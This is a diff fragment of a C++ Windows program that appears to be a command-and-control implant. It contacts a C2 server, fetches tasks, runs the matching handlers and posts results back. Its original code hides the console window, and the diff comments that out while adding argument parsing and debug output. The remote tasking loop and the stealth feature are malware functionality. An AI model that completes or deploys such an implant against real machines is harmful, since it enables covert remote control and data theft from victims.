@@ -14,10 +14,12 @@
 
 #pragma comment(lib, "winhttp.lib")
 
+std::vector <std::string> split(std::string cmd, char delimiter = ' ');
+
 int main()
 {
 	// Hide console window
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 	Agent agent(C2_IP, C2_PORT);
 	Command cmdHandler;
 
@@ -32,12 +34,16 @@ int main()
 
 		if (task != "") {
 			std::vector <std::string> Task = split(task);
+			std::vector <std::string> args;
+			args = std::vector<std::string>(Task.begin() + 1, Task.end());
 			std::string Cmd = Task[0];
+
+			std::cout << Cmd;
 
 			if (cmdHandler.HasCommand(Cmd)) {
 				std::string result;
 				
-				result = cmdHandler.ExecuteCommand(Cmd);
+				cmdHandler.ExecuteCommand(Cmd);
 
 				agent.Post(RETURN_URI, result);
 			}		
@@ -48,7 +54,7 @@ int main()
 }
 
 
-std::vector <std::string> split(std::string cmd, char delimiter = ' ') {
+std::vector <std::string> split(std::string cmd, char delimiter) {
 	std::string line;
 	std::vector <std::string> vec;
 	std::stringstream ss(cmd);
